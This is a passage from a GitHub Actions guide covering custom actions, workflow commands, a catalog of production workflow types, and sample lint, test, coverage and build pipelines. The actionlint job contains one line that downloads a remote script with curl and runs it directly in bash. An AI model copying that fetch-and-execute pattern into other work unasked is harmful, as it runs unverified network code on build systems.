    core.setFailed(`Timed out after ${timeout}s waiting for ${expected} at ${url}`);
  } catch (error) {
    core.setFailed(error instanceof Error ? error.message : String(error));
  }
}

run();
```

Toolkit packages worth knowing:

| Package | Purpose |
|---|---|
| `@actions/core` | Inputs, outputs, logging, masking, summaries, state, `exportVariable`, `addPath` |
| `@actions/github` | Authenticated Octokit + the event context |
| `@actions/exec` | Run a command, capture output, control failure |
| `@actions/io` | `mkdirP`, `cp`, `mv`, `which` — cross-platform |
| `@actions/tool-cache` | Download, extract, and cache a tool in `RUNNER_TOOL_CACHE` |
| `@actions/glob` | Glob matching and hashing |
| `@actions/artifact` | Programmatic artifact upload/download |
| `@actions/cache` | Programmatic cache access |

Key `core` methods:

```typescript
core.getInput('name', { required: true });
core.getBooleanInput('flag');
core.getMultilineInput('paths');
core.setOutput('key', 'value');
core.exportVariable('MY_VAR', 'x');   // writes GITHUB_ENV
core.addPath('/opt/tool/bin');        // writes GITHUB_PATH
core.setSecret('sensitive');          // adds a mask
core.setFailed('message');            // logs error + exit code 1
core.info / core.debug / core.warning / core.error / core.notice
core.startGroup('Name'); core.endGroup();
core.saveState('key', 'v'); core.getState('key');   // main → post
core.summary.addRaw('...').write();
```

### 23.4 `pre`, `main`, `post`

```yaml
runs:
  using: node24
  pre: 'dist/pre/index.js'
  pre-if: 'runner.os == "Linux"'
  main: 'dist/index.js'
  post: 'dist/post/index.js'
  post-if: 'always()'
```

The `post` step runs at the end of the job, in reverse order of the actions that registered one. This is how `actions/cache` saves the cache, how `actions/checkout` removes the credentials from git config, and how a `harden-runner` action reports egress at the end.

Pass state from `main` to `post` with `core.saveState` / `core.getState`.

### 23.5 The `dist/` problem

The runner does **not** run `npm install` for your action. It clones the repo and runs `main:` directly. So all dependencies must be bundled into a single committed file.

```json
{
  "scripts": {
    "build": "tsc",
    "package": "ncc build lib/main.js -o dist --source-map --license licenses.txt",
    "all": "npm run build && npm run package"
  }
}
```

Then **commit `dist/`**. Yes, it feels wrong. It is how actions work.

Add a CI check so a stale `dist/` cannot be merged:

```yaml
- run: npm ci && npm run all
- name: Fail if dist is out of date
  run: |
    if [ -n "$(git status --porcelain dist/)" ]; then
      echo "::error::dist/ is out of date. Run 'npm run all' and commit." 
      git diff --stat dist/
      exit 1
    fi
```

---

## Chapter 24 — Docker Container Actions

### 24.1 When to use one

When your action needs a specific OS, non-JS tooling, or complete environment isolation. Linux runners only, and slower to start.

```yaml
# action.yml
name: 'Schema validator'
description: 'Validates OpenAPI specs with a pinned toolchain'
inputs:
  spec-path:
    description: 'Path to the OpenAPI spec'
    required: true
  strict:
    required: false
    default: 'false'
outputs:
  error-count:
    description: 'Number of validation errors'
runs:
  using: 'docker'
  image: 'Dockerfile'            # or 'docker://ghcr.io/org/validator:1.2.0'
  args:
    - ${{ inputs.spec-path }}
    - ${{ inputs.strict }}
  env:
    LOG_LEVEL: info
```

```dockerfile
FROM alpine:3.20
RUN apk add --no-cache nodejs npm bash jq \
 && npm install -g @redocly/cli@1.25.0
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

```bash
#!/usr/bin/env bash
# entrypoint.sh
set -euo pipefail
SPEC="$1"
STRICT="$2"

ARGS=()
[ "$STRICT" = "true" ] && ARGS+=(--max-problems 0)

if redocly lint "$SPEC" "${ARGS[@]}" > /tmp/out.txt 2>&1; then
  COUNT=0
else
  COUNT="$(grep -c 'error' /tmp/out.txt || true)"
fi

echo "error-count=$COUNT" >> "$GITHUB_OUTPUT"
cat /tmp/out.txt
[ "$COUNT" -eq 0 ]
```

### 24.2 How the runner invokes it

```mermaid
sequenceDiagram
    participant R as Runner
    participant D as Docker
    participant C as Action container

    R->>D: docker build (if image: Dockerfile) — adds ~30-90s
    R->>D: docker run with:<br/>-v workspace:/github/workspace<br/>-v /home/runner/work/_temp/_github_home:/github/home<br/>-e INPUT_SPEC_PATH -e GITHUB_* ...<br/>--workdir /github/workspace
    D->>C: ENTRYPOINT with args
    C->>C: read INPUT_* env vars
    C->>C: append to $GITHUB_OUTPUT
    C-->>R: exit code (0 = success)
    R->>R: read outputs, continue
```

Key mechanics:
- **Inputs become environment variables** named `INPUT_<NAME>`, uppercased with `-` → `_`.
- The workspace is mounted at `/github/workspace` and is the working directory.
- **Exit code 0 = success**, anything else fails the step.
- **Pre-build and push your image** (`image: docker://ghcr.io/org/tool:1.2.0`) rather than `image: Dockerfile` — you avoid a build on every run, which can be 60–90 seconds.

⚠️ Files your container creates in `/github/workspace` will be owned by the container's user (often root). Later steps running as `runner` may not be able to delete them.

---

## Chapter 25 — Workflow Commands and the Runner Protocol

### 25.1 The idea

The runner parses each step's stdout looking for lines of the form:

```
::command parameter=value,parameter=value::message
```

These are how a process running on the runner talks back to the Actions service. Every action, in every language, ultimately uses these.

### 25.2 The command set

```bash
# Logging levels
echo "::debug::Only shown when ACTIONS_STEP_DEBUG=true"
echo "::notice::A neutral message"
echo "::warning::A warning"
echo "::error::An error"

# Annotations tied to a file, line and column — these show up inline in the PR diff
echo "::error file=src/main/java/App.java,line=42,col=9,title=NullPointer risk::Field may be null"
echo "::warning file=pom.xml,line=88::Dependency has a known CVE"
echo "::notice file=README.md,line=1::Consider adding a usage section"

# Grouping (collapsible sections in the log)
echo "::group::Dependency tree"
mvn -B dependency:tree
echo "::endgroup::"

# Masking
echo "::add-mask::$SOME_DERIVED_SECRET"

# Stop/start command processing — use when echoing untrusted content
echo "::stop-commands::my-unique-token"
cat untrusted-output.txt
echo "::my-unique-token::"
```

### 25.3 Annotations are the highest-value, lowest-effort UX win

An annotation appears **inline in the PR's Files Changed view**, right on the offending line. This turns "read 4,000 lines of log output" into "see the problem where you made it".

Most linters can emit the GitHub format directly:

```yaml
- run: golangci-lint run --out-format=github-actions
- run: npx eslint . --format=@microsoft/eslint-formatter-sarif -o eslint.sarif
- run: ./mvnw -B checkstyle:check   # then convert, or use a reporter action
```

Or convert any tool's output:

```yaml
- name: Convert Checkstyle to annotations
  if: always()
  run: |
    python3 - <<'PY'
    import xml.etree.ElementTree as ET, glob, os
    for f in glob.glob('**/target/checkstyle-result.xml', recursive=True):
        for file_el in ET.parse(f).getroot():
            path = os.path.relpath(file_el.get('name'), os.getcwd())
            for err in file_el:
                lvl = {'error':'error','warning':'warning'}.get(err.get('severity'),'notice')
                print(f"::{lvl} file={path},line={err.get('line','1')}::{err.get('message')}")
    PY
```

Limits: 10 warning + 10 error + 10 notice annotations are displayed per step (the rest are recorded but truncated in the UI).

### 25.4 The environment files (recap, as the modern replacement)

`::set-output` and `::set-env` are **disabled**. The replacements are `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_PATH` and `$GITHUB_STEP_SUMMARY` (Chapter 10). The reason for the change was exactly the injection risk that `::stop-commands::` exists to mitigate.

---

## Chapter 26 — Choosing and Publishing Your Own Building Blocks

### 26.1 The decision tree

```mermaid
flowchart TD
    A["I am repeating something"] --> B{"Is it a whole job<br/>or a group of jobs?"}
    B -->|"Yes"| RW["Reusable workflow"]
    B -->|"No, a few steps"| C{"Do the steps need<br/>real logic, loops,<br/>API calls, retries?"}
    C -->|"No, just shell + existing actions"| CA["Composite action"]
    C -->|"Yes"| D{"Does it need a<br/>specific OS or<br/>non-JS toolchain?"}
    D -->|"No"| JS["JavaScript action"]
    D -->|"Yes"| DK["Docker action"]
    A --> E{"Is it just<br/>3 lines of bash?"}
    E -->|"Yes"| SH["Leave it as a run: step.<br/>Do not abstract yet"]
```

🧠 **Rule of three.** Do not extract an abstraction until you have written it three times. Premature reusable workflows are worse than duplication — they become a cross-team coupling point that nobody can change.

### 26.2 Versioning your actions and workflows

Use semantic versioning with a **moving major tag**:

```bash
git tag -a v1.4.2 -m "Release v1.4.2"
git push origin v1.4.2

# move the major tag
git tag -fa v1 -m "Update v1 to v1.4.2"
git push origin v1 --force
```

Consumers use `@v1` and get patches automatically. Automate it:

```yaml
# .github/workflows/tag-major.yml
on:
  release:
    types: [published]
permissions:
  contents: write
jobs:
  retag:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - run: |
          set -euo pipefail
          TAG="${GITHUB_REF_NAME}"                 # v1.4.2
          MAJOR="${TAG%%.*}"                       # v1
          git config user.name  'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git tag -fa "$MAJOR" -m "Update $MAJOR to $TAG"
          git push origin "$MAJOR" --force
```

### 26.3 The internal "paved road" pattern

The mature shape for an organisation:

```
my-org/
├── shared-workflows/                  # reusable workflows, versioned
│   └── .github/workflows/
│       ├── java-service-ci.yml
│       ├── go-service-ci.yml
│       ├── container-build-push.yml
│       ├── deploy-k8s.yml
│       └── security-scan.yml
├── shared-actions/                    # composite + JS actions
│   ├── setup-java-build/
│   ├── setup-go-build/
│   ├── notify-slack/
│   └── wait-for-healthy/
└── service-a/
    └── .github/workflows/
        └── ci.yml                     # 15 lines, calls the shared workflows
```

A service repo's entire pipeline becomes:

```yaml
name: CI/CD
on:
  pull_request:
  push: { branches: [main] }

permissions:
  contents: read

jobs:
  ci:
    uses: my-org/shared-workflows/.github/workflows/java-service-ci.yml@v3
    with: { java-version: '21' }
    secrets: inherit

  build-push:
    needs: ci
    if: github.event_name == 'push'
    uses: my-org/shared-workflows/.github/workflows/container-build-push.yml@v3
    with: { service: api }
    secrets: inherit

  deploy-staging:
    needs: build-push
    uses: my-org/shared-workflows/.github/workflows/deploy-k8s.yml@v3
    with:
      environment: staging
      image: ${{ needs.build-push.outputs.image }}
    secrets: inherit
```

Benefits: one place to fix a CVE in a base image, one place to add a new required security scan, consistent behaviour across 50 services, and OIDC trust policies that can be locked to `job_workflow_ref`.

Costs: you now own a platform. Version it, document it, and never break `@v3` without a migration path.

---
# Part IV — The Workflow Catalog

This is the part you asked for most directly: *what can workflows actually do, and which ones do real teams run in production?*

---

## Chapter 27 — A Taxonomy of Production Workflows

### 27.1 The map

```mermaid
flowchart TD
    ROOT["Production workflow types"]

    ROOT --> V["VERIFY<br/>Is this change safe?"]
    ROOT --> P["PRODUCE<br/>Make the artifact"]
    ROOT --> S["SHIP<br/>Get it to users"]
    ROOT --> O["OPERATE<br/>Run the system"]
    ROOT --> G["GOVERN<br/>Keep it healthy and compliant"]

    V --> VA["A. Quality gates<br/>lint, format, typecheck, commit hygiene"]
    V --> VB["B. Tests<br/>unit, integration, contract, e2e, load"]
    V --> VD["D. Security scans<br/>SAST, SCA, secrets, IaC, container"]

    P --> PC["C. Build & package<br/>compile, multi-arch, reproducible builds"]
    P --> PE["E. Publish<br/>registries, packages, images, SBOM, signing"]

    S --> SF["F. Deploy<br/>rolling, blue/green, canary, GitOps"]
    S --> SG["G. Release engineering<br/>versioning, changelogs, tags, releases"]
    S --> SH["H. Infrastructure as code<br/>plan/apply, drift detection"]

    O --> OI["I. Scheduled & maintenance<br/>nightlies, cleanup, cert renewal"]
    O --> OJ["J. Manual runbooks<br/>rollback, restart, backfill, feature flags"]
    O --> OL["L. Orchestration<br/>monorepo fan-out, cross-repo triggers"]
    O --> OM["M. Notifications & alerting"]

    G --> GK["K. Repo automation & ChatOps"]
    G --> GN["N. Observability & analytics"]
    G --> GO["O. Governance & compliance"]
```

### 27.2 The trigger/purpose matrix

The single most useful table in this guide. Find your row, copy the pattern.

| # | Workflow type | Typical trigger | Runs on | Needs secrets? | Permissions | Latency target |
|---|---|---|---|---|---|---|
| A | Lint / format / typecheck | `pull_request` | hosted | no | `contents: read` | < 1 min |
| A | Commit/PR title lint | `pull_request` (types incl. `edited`) | hosted | no | `contents: read` | < 30 s |
| B | Unit tests | `pull_request`, `push` | hosted, matrix | no | `contents: read` | < 5 min |
| B | Integration tests | `pull_request`, `push` | hosted + services | maybe | `contents: read` | < 10 min |
| B | E2E tests | `push: main`, `schedule` | hosted, sharded | yes | `contents: read` | < 20 min |
| B | Load / performance | `schedule`, `workflow_dispatch` | larger/self-hosted | yes | `contents: read` | minutes–hours |
| C | Build & package | `push`, `pull_request` | hosted | maybe | `contents: read` | < 5 min |
| D | SAST (CodeQL) | `pull_request`, `schedule` | hosted (larger for big repos) | no | `security-events: write` | < 15 min |
| D | Dependency review | `pull_request` | hosted | no | `contents: read`, `pull-requests: write` | < 1 min |
| D | Container scan | after image build | hosted | registry | `security-events: write` | < 3 min |
| D | Secret scan / IaC scan | `pull_request` | hosted | no | `security-events: write` | < 2 min |
| E | Push image to registry | `push: main`, `release` | hosted | OIDC | `packages: write`, `id-token: write` | < 5 min |
| E | Publish library | `release`, tag push | hosted | registry token / OIDC | `contents: read`, `packages: write` | < 5 min |
| F | Deploy staging | `push: main` (after build) | hosted | OIDC | `deployments: write`, `id-token: write` | < 5 min |
| F | Deploy production | `workflow_dispatch`, `release` | hosted | OIDC + environment | same + environment gate | human-gated |
| F | Rollback | `workflow_dispatch` | hosted | OIDC | same | < 2 min |
| G | Release / changelog | tag push, `workflow_dispatch` | hosted | App token | `contents: write` | < 3 min |
| H | Terraform plan | `pull_request` on `infra/**` | hosted | OIDC read | `pull-requests: write`, `id-token: write` | < 5 min |
| H | Terraform apply | `push: main` on `infra/**` | hosted | OIDC write | `id-token: write` + environment | human-gated |
| H | Drift detection | `schedule` | hosted | OIDC read | `issues: write` | nightly |
| I | Nightly full test | `schedule` | hosted, matrix | yes | `contents: read` | nightly |
| I | Cache / artifact cleanup | `schedule` | hosted | no | `actions: write` | weekly |
| J | Manual runbook | `workflow_dispatch` | hosted | OIDC | task-specific | on demand |
| K | Auto-label, triage, stale | `issues`, `pull_request_target`, `schedule` | hosted | no | `issues: write`, `pull-requests: write` | seconds |
| K | ChatOps | `issue_comment` | hosted | App token | varies | seconds |
| L | Monorepo fan-out | `pull_request`, `push` | hosted | varies | varies | depends |
| L | Cross-repo trigger | `repository_dispatch`, `workflow_run` | hosted | App token | `contents: read` | seconds |
| M | Slack/Discord notify | `workflow_run`, job-level `if: failure()` | hosted | webhook | `actions: read` | seconds |
| N | Metrics export | `workflow_run: completed` | hosted | OTLP/APM creds | `actions: read` | seconds |
| O | License / policy check | `pull_request` | hosted | no | `contents: read` | < 2 min |

### 27.3 How to sequence them

```mermaid
flowchart LR
    subgraph PR["On every pull request — fast, cheap, blocking"]
        L["Lint<br/>15s"] --> G1["Gate"]
        U["Unit tests<br/>3m"] --> G1
        SC["Dependency review<br/>+ secret scan<br/>30s"] --> G1
        B["Build<br/>2m"] --> IT["Integration tests<br/>6m"] --> G1
    end
    subgraph MAIN["On merge to main — produce and ship to staging"]
        G1 --> BP["Build & push image<br/>with provenance"]
        BP --> VS["Vulnerability scan<br/>+ SBOM"]
        VS --> DS["Deploy staging"]
        DS --> SM["Smoke tests"]
    end
    subgraph PROD["Promotion — gated"]
        SM --> AP{"Approval<br/>environment: production"}
        AP --> DP["Deploy production<br/>same digest"]
        DP --> PS["Post-deploy verification"]
        PS --> NT["Notify Slack"]
    end
    subgraph OUT["Continuous, out of band"]
        N1["Nightly E2E"]
        N2["CodeQL weekly"]
        N3["Drift detection"]
        N4["Dependabot"]
        N5["Metrics export"]
    end
```

🧠 **The design rule: blocking work must be fast; slow work must be non-blocking.** If your PR gate takes 25 minutes, developers stop caring about it. Move the slow, broad, low-yield checks (full E2E matrix, deep security scans, performance tests) to `push: main` or a nightly schedule, and keep the PR gate under ten minutes.

---

## Chapter 28 — Category A: Fast Feedback and Quality Gates

**Purpose:** catch trivially-detectable problems in seconds, before a human reviewer or an expensive test suite is involved.

**Why it exists:** review time is the scarcest resource on a team. Every comment saying "missing final newline" is a comment not spent on architecture.

### 28.1 The standard PR quality workflow

```yaml
# .github/workflows/pr-quality.yml
name: PR Quality

on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]

permissions:
  contents: read

concurrency:
  group: pr-quality-${{ github.event.pull_request.number }}
  cancel-in-progress: true

# Least-privilege cache access on an untrusted-input workflow
cache-mode: read

jobs:
  lint:
    if: github.event.pull_request.draft == false
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }

      - name: Spotless (format check)
        run: mvn -B -ntp spotless:check

      - name: Checkstyle
        if: always()
        run: mvn -B -ntp checkstyle:check

      - name: SpotBugs
        if: always()
        run: mvn -B -ntp spotbugs:check

      - name: PMD
        if: always()
        run: mvn -B -ntp pmd:check

  workflow-lint:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v7
      - name: actionlint
        run: |
          bash <(curl -sSf https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
          ./actionlint -color

  yaml-and-markdown:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v7
      - run: pipx run yamllint .
      - run: npx --yes markdownlint-cli2 "**/*.md" "#node_modules"
```

🧠 Note `if: always()` on the second and subsequent linters. Without it, Checkstyle never runs when Spotless fails, so the developer fixes formatting, pushes, and *then* discovers the Checkstyle problems. Run them all, report them all, fix once.

### 28.2 Go equivalent

```yaml
  lint:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with: { go-version: '1.24', cache: true }

      - name: gofmt
        run: |
          UNFORMATTED="$(gofmt -l .)"
          if [ -n "$UNFORMATTED" ]; then
            echo "$UNFORMATTED" | while read -r f; do
              echo "::error file=$f::File is not gofmt-formatted"
            done
            exit 1
          fi

      - run: go vet ./...

      - uses: golangci/golangci-lint-action@v8
        with:
          version: latest
          args: --timeout=5m --out-format=github-actions

      - name: Check go.mod is tidy
        run: |
          go mod tidy
          git diff --exit-code go.mod go.sum
```

### 28.3 Commit and PR hygiene

```yaml
  pr-title:
    runs-on: ubuntu-24.04
    permissions:
      pull-requests: read
    steps:
      - uses: amannn/action-semantic-pull-request@v6
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          types: |
            feat
            fix
            chore
            docs
            refactor
            perf
            test
            build
            ci
          requireScope: false
          subjectPattern: ^(?![A-Z]).+$
          subjectPatternError: |
            The subject "{subject}" must start with a lowercase letter.
```

⚠️ Add `edited` to your `pull_request` types, or the check will not re-run when someone fixes the title.

Other hygiene checks worth having:
- **PR size** — warn above ~400 changed lines. Large PRs get worse reviews.
- **No merge commits** on the branch (if you enforce rebase).
- **Changelog entry present** for user-facing changes.
- **`CODEOWNERS` file is valid.**
- **No `TODO(username)` without a linked issue.**

### 28.4 Reporting results usefully

```yaml
      - name: Write summary
        if: always()
        run: |
          {
            echo "## Lint results"
            echo ""
            echo "| Check | Result |"
            echo "|---|---|"
            echo "| Spotless | ${{ steps.spotless.outcome }} |"
            echo "| Checkstyle | ${{ steps.checkstyle.outcome }} |"
            echo "| SpotBugs | ${{ steps.spotbugs.outcome }} |"
          } >> "$GITHUB_STEP_SUMMARY"
```

### 28.5 Auto-fixing instead of failing

For purely mechanical issues, pushing a fix is friendlier than failing:

```yaml
  autoformat:
    if: github.event.pull_request.head.repo.full_name == github.repository   # not forks
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.head_ref }}
          token: ${{ steps.app-token.outputs.token }}
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }
      - run: mvn -B -ntp spotless:apply
      - name: Commit if changed
        run: |
          if [ -n "$(git status --porcelain)" ]; then
            git config user.name  'github-actions[bot]'
            git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
            git commit -am "style: apply spotless formatting"
            git push
          fi
```

⚠️ Two caveats: this does not work for fork PRs (no write access — correctly), and a push made with `GITHUB_TOKEN` will not re-trigger CI. Use a GitHub App token if the fix must re-run checks.

### 28.6 Path filters and required checks — the classic trap

```yaml
on:
  pull_request:
    paths: ['src/**', 'pom.xml']
```

If `lint` is a required status check and someone opens a docs-only PR, `lint` never runs, the check never reports, and the PR is blocked forever.

**Three fixes, in order of quality:**

1. **The gate-job pattern (best).** Run the workflow always; make the individual jobs conditional; have a single always-running gate job report the result. See §11.4 and §46.4.
2. **A companion "skip" workflow** with the same job names and inverted path filters that trivially succeeds. Works, but duplicated names are fragile.
3. **`paths-ignore` with a very conservative list.** Less likely to skip something that matters.

---

## Chapter 29 — Category B: Test Workflows

### 29.1 The test pyramid, mapped to triggers

```mermaid
flowchart TD
    subgraph P["Where each layer runs"]
        U["Unit tests<br/>seconds–minutes · no external deps"] -->|"every PR, blocking"| T1["pull_request"]
        I["Integration tests<br/>minutes · real DB, real broker"] -->|"every PR, blocking"| T1
        C["Contract tests<br/>minutes · Pact / OpenAPI"] -->|"every PR + on provider change"| T1
        E["E2E tests<br/>10-40 min · full stack"] -->|"push to main + nightly"| T2["push: main / schedule"]
        L["Load & performance<br/>30 min-hours"] -->|"nightly / pre-release"| T3["schedule / workflow_dispatch"]
        CH["Chaos / resilience"] -->|"weekly on staging"| T3
    end
```

### 29.2 Unit tests with a matrix

```yaml
# .github/workflows/test-unit.yml
name: Unit Tests
on:
  pull_request:
  push: { branches: [main] }

permissions:
  contents: read

jobs:
  unit:
    name: Unit · JDK ${{ matrix.java }}
    strategy:
      fail-fast: false
      matrix:
        java: ['21']
        include:
          - java: '25'
            experimental: true
    continue-on-error: ${{ matrix.experimental || false }}
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '${{ matrix.java }}', cache: maven }

      - name: Run unit tests
        run: mvn -B -ntp test -Dsurefire.printSummary=false

      - name: Publish test report
        if: always()
        uses: mikepenz/action-junit-report@v6
        with:
          report_paths: '**/target/surefire-reports/TEST-*.xml'
          check_name: 'Unit test report (JDK ${{ matrix.java }})'
          detailed_summary: true
          annotate_only: true

      - name: Upload reports
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: surefire-jdk${{ matrix.java }}
          path: '**/target/surefire-reports/**'
          retention-days: 7
          if-no-files-found: ignore
```

### 29.3 Integration tests: three approaches

**Approach 1 — service containers (declarative)**

See §16.2 for the full example. Good when the dependency set is small and stable.

**Approach 2 — Testcontainers (recommended for backend services)**

No `services:` block at all. Your tests start their own containers, so `mvn verify` works identically on a laptop and in CI.

```yaml
  integration:
    runs-on: ubuntu-24.04
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }

      # Optional: pre-pull images so the test's own timeout isn't spent downloading
      - run: |
          docker pull postgres:17-alpine &
          docker pull confluentinc/cp-kafka:7.6.0 &
          wait

      - run: mvn -B -ntp verify -Pintegration-tests
        env:
          TESTCONTAINERS_RYUK_DISABLED: 'false'
          TESTCONTAINERS_REUSE_ENABLE: 'false'
```

```java
@SpringBootTest
@Testcontainers
class OrderRepositoryIT {
    @Container
    @ServiceConnection
    static PostgreSQLContainer<?> postgres =
        new PostgreSQLContainer<>("postgres:17-alpine");
    // Spring Boot wires the datasource automatically. Nothing in the workflow file.
}
```

**Approach 3 — docker compose**

```yaml
      - run: docker compose -f docker-compose.test.yml up -d --wait
      - run: mvn -B verify -Pintegration-tests
      - if: always()
        run: |
          docker compose -f docker-compose.test.yml logs --no-color > compose-logs.txt
          docker compose -f docker-compose.test.yml down -v
      - if: always()
        uses: actions/upload-artifact@v7
        with: { name: compose-logs, path: compose-logs.txt }
```

`--wait` respects the healthchecks in the compose file — much better than `sleep 30`.

### 29.4 Coverage with a threshold and a PR comment

```yaml
  coverage:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }

      - run: mvn -B -ntp verify -Pcoverage

      - name: Enforce threshold
        run: |
          set -euo pipefail
          PCT=$(python3 - <<'PY'
          import xml.etree.ElementTree as ET
          r = ET.parse('target/site/jacoco/jacoco.xml').getroot()
          c = [x for x in r.findall('counter') if x.get('type') == 'LINE'][0]
          m, cov = int(c.get('missed')), int(c.get('covered'))
          print(round(100 * cov / (m + cov), 2))
          PY
          )
          echo "COVERAGE=$PCT" >> "$GITHUB_ENV"
          echo "Line coverage: ${PCT}%"
          awk -v p="$PCT" 'BEGIN { exit (p >= 80) ? 0 : 1 }' || {
            echo "::error::Coverage ${PCT}% is below the 80% threshold"
            exit 1
          }

      - name: Comment on PR
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v9
        with:
          script: |
            const pct = process.env.COVERAGE;
            const marker = '<!-- coverage-bot -->';
            const body = `${marker}\n### Coverage: **${pct}%**\n\nThreshold: 80%`;
            const { data: comments } = await github.rest.issues.listComments({
              ...context.repo, issue_number: context.issue.number,
            });
            const existing = comments.find(c => c.body?.includes(marker));
            if (existing) {
              await github.rest.issues.updateComment({ ...context.repo, comment_id: existing.id, body });
            } else {
              await github.rest.issues.createComment({ ...context.repo, issue_number: context.issue.number, body });
            }
```

🧠 The marker-and-update pattern keeps one comment that gets edited, instead of a new comment on every push. Do this for every bot comment.

### 29.5 E2E tests with sharding

```yaml
# .github/workflows/e2e.yml
name: E2E
on:
  push: { branches: [main] }
  schedule: [{ cron: '0 3 * * *' }]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  e2e:
    name: E2E shard ${{ matrix.shard }}/4
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: { node-version: '22', cache: npm }
      - run: npm ci
      - run: npx playwright install --with-deps chromium

      - run: npx playwright test --shard=${{ matrix.shard }}/${{ strategy.job-total }}
        env:
          BASE_URL: ${{ vars.STAGING_URL }}

      - if: failure()
        uses: actions/upload-artifact@v7
        with:
          name: playwright-traces-shard-${{ matrix.shard }}
          path: |
            playwright-report/
            test-results/
          retention-days: 7

  e2e-report:
    if: always()
    needs: e2e
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/download-artifact@v8
        with: { pattern: playwright-*, path: reports, merge-multiple: true }
      - run: |
          {
            echo "## E2E results"
            echo "Shards: ${{ needs.e2e.result }}"
          } >> "$GITHUB_STEP_SUMMARY"
```

### 29.6 Contract tests

Prevent the classic microservice breakage: a provider changes a response shape and a consumer breaks in production.

```yaml
  consumer-contracts:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - run: mvn -B test -Dtest='*ContractTest'
      - name: Publish pacts
        run: |
          pact-broker publish target/pacts \
            --consumer-app-version "${GITHUB_SHA}" \
            --branch "${GITHUB_REF_NAME}" \
            --broker-base-url "$PACT_BROKER_URL" \
            --broker-token "$PACT_BROKER_TOKEN"
        env:
          PACT_BROKER_URL: ${{ vars.PACT_BROKER_URL }}
          PACT_BROKER_TOKEN: ${{ secrets.PACT_BROKER_TOKEN }}

      - name: Can I deploy?
        run: |
          pact-broker can-i-deploy \
            --pacticipant my-service \
            --version "${GITHUB_SHA}" \
            --to-environment production
```

`can-i-deploy` is the gate: it fails if any consumer's expectations are not satisfied by the provider version currently in production.

### 29.7 Load and performance testing

```yaml
# .github/workflows/perf.yml
name: Performance
on:
  schedule: [{ cron: '0 2 * * *' }]
  workflow_dispatch:
    inputs:
      duration:
        type: string
        default: '5m'
      vus:
        type: number
        default: 50

permissions:
  contents: read
  issues: write

jobs:
  k6:
    runs-on: ubuntu-24.04-16-cores      # load generators need headroom
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v7
      - uses: grafana/setup-k6-action@v1
      - name: Run load test
        run: |
          k6 run perf/load.js \
            --vus "${VUS}" --duration "${DURATION}" \
            --summary-export=summary.json
        env:
          VUS: ${{ inputs.vus || 50 }}
          DURATION: ${{ inputs.duration || '5m' }}
          K6_TARGET: ${{ vars.STAGING_URL }}

      - name: Check SLOs
        run: |
          P95=$(jq '.metrics.http_req_duration["p(95)"]' summary.json)
          ERR=$(jq '.metrics.http_req_failed.value' summary.json)
          echo "p95=${P95}ms error_rate=${ERR}"
          awk -v p="$P95" 'BEGIN { exit (p < 500) ? 0 : 1 }' \
            || { echo "::error::p95 ${P95}ms exceeds 500ms budget"; exit 1; }

      - name: Open an issue on regression
        if: failure()
        uses: actions/github-script@v9
        with:
          script: |
            await github.rest.issues.create({
              ...context.repo,
              title: `Performance regression detected (run ${context.runId})`,
              labels: ['performance', 'automated'],
              body: `Nightly load test failed its SLO check.\n\n[Run](${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId})`
            });
```

⚠️ Do not run load tests against production from CI without explicit coordination. Run them against a dedicated perf environment, and note that hosted runners are shared infrastructure — results have meaningful variance. Use them for *regression detection against a baseline*, not for absolute capacity numbers.

---

## Chapter 30 — Category C: Build and Package

**Purpose:** turn source code into an immutable, deployable artifact, exactly once.

### 30.1 The core build job

```yaml
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    outputs:
      version: ${{ steps.meta.outputs.version }}
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }      # needed for git describe

      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }

      - id: meta
        run: |
          set -euo pipefail
          VERSION="$(git describe --tags --always --dirty)"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "Building $VERSION"

      - name: Build
        run: |
          mvn -B -ntp clean package -DskipTests \
            -Drevision="${{ steps.meta.outputs.version }}"

      - uses: actions/upload-artifact@v7
        with:
          name: app-jar
          path: target/*.jar
          retention-days: 3
          if-no-files-found: error
```

Useful Maven/Gradle flags for CI:

| Flag | Why |
|---|---|
